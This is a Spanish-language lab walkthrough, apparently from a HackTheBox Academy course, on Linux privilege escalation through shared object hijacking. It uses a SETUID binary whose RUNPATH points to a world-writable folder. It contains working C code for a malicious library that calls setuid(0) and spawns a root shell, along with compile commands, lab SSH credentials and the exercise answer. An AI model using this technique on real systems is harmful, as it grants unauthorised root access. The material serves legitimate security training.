
# Secuestro de objetos compartidos

Los programas y binarios en desarrollo suelen tener bibliotecas personalizadas asociadas. Considere el siguiente binario `SETUID`.

```shell-session
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) para imprimir el objeto compartido requerido por un objeto binario o compartido. `Ldd` muestra la ubicación del objeto y la dirección hexadecimal donde se carga en la memoria para cada una de las dependencias de un programa.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

Vemos una biblioteca no estándar nombrada `libshared.so` como dependencia para el binario. Como se dijo anteriormente, es posible cargar bibliotecas compartidas desde ubicaciones personalizadas. Una de esas configuraciones es la configuración `RUNPATH`. Las bibliotecas en esta carpeta tienen preferencia sobre otras carpetas. Esto se puede inspeccionar usando la utilidad [readelf .](https://man7.org/linux/man-pages/man1/readelf.1.html)

```shell-session
htb-student@NIX02:~$ readelf -d payroll | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

La configuración permite cargar bibliotecas desde la carpeta `/development`, en la que todos los usuarios pueden escribir. Esta configuración incorrecta se puede aprovechar colocando una biblioteca maliciosa en `/development`, que tendrá prioridad sobre otras carpetas porque las entradas de este archivo se comprueban primero (antes que otras carpetas presentes en los archivos de configuración).

```shell-session
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función llamada por el binario.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Podemos copiar una biblioteca existente a la carpeta `development`. Al ejecutar el binario `ldd`, la ruta de la biblioteca aparece como `/development/libshared.so`, lo que significa que es vulnerable. Al ejecutar el binario, se genera un error que indica que no se pudo encontrar la función denominada `dbquery`. Podemos compilar un objeto compartido que incluya esta función.

{% code title="src.c" %}

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

{% endcode %}

La función `dbquery` establece nuestro ID de usuario en 0 (root) y se ejecuta `/bin/sh` cuando se la llama. Compílela con [GCC](https://linux.die.net/man/1/gcc) :

```shell-session
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Al ejecutar el binario nuevamente debería aparecer el banner y aparecer un shell root.

```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.175.139 (ACADEMY-LPE-NIX02)
Usuario "htb-student"
Contraseña "Academy_LLPE!"
```

Siga los ejemplos de esta sección para escalar privilegios, vuelva a crear todos los ejemplos (no ejecute simplemente el binario payroll). Practique el uso de ldd y readelf. Envíe la versión de `glibc` (es decir, 2.30) en uso para pasar a la siguiente sección.

Al acceder por SSH nos encontramos con estos archivos, entre los que destaca payroll ya que pertenece al usuario root:

```shell-session
htb-student@NIX02:~/shared_obj_hijack$ ls -la
total 60
drwxr-xr-x 2 root        root         4096 Jan 25  2024 .
drwxr-xr-x 7 htb-student htb-student  4096 Nov 19 10:06 ..
-rw-r--r-- 1 htb-student htb-student   195 Sep  1  2020 dbquery.c
-rw-r--r-- 1 htb-student htb-student    20 Sep  1  2020 dbquery.h
-rwxr-xr-x 1 htb-student htb-student 16200 Sep  1  2020 libshared.so
-rwsr-xr-x 1 root        root        16728 Sep  1  2020 payroll
-rw-r--r-- 1 htb-student htb-student   126 Sep  1  2020 payroll.c
-rw-r--r-- 1 htb-student htb-student   141 Sep  1  2020 src.c
```

Elevar nuestros privilegios en este escenario sería tan fácil como ejecutarlo, tal y cómo hemos visto en esta sección:

```shell-session
htb-student@NIX02:~/shared_obj_hijack$ ./payroll 
***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1008(htb-student) groups=1008(htb-student)
```

### Pasos para practicar con **ldd** y **readelf**:

1. **Usar `ldd` para verificar dependencias de un binario**

Ejecuta el comando `ldd <nombre_del_binario>` para listar las bibliotecas compartidas que utiliza un binario:

```bash
ldd payroll
	linux-vdso.so.1 (0x00007fffa5189000)
	libshared.so => /development/libshared.so (0x00007f14760e1000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1475cf0000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f14762e3000)
```

Esto mostrará las rutas de las bibliotecas compartidas y si están correctamente enlazadas.

2. **Usar `readelf` para analizar el binario**

Ejecuta el comando `readelf -h <nombre_del_binario>` para obtener el encabezado ELF del binario.

```bash
readelf -h payroll
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x1080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          14744 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 30
```

Opcionalmente, puedes inspeccionar otras secciones como la tabla de símbolos:

```bash
readelf -s payroll

Symbol table '.dynsym' contains 8 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dbquery
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
     7: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5 (2)
     <----SNIP---->
```

3. **Obtener la versión de glibc**

Hay varias formas de obtener la versión de la biblioteca glibc:

* Consultando la versión directamente desde el sistema:

```bash
ldd --version

ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

Inspeccionando la biblioteca directamente:

```bash
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
```
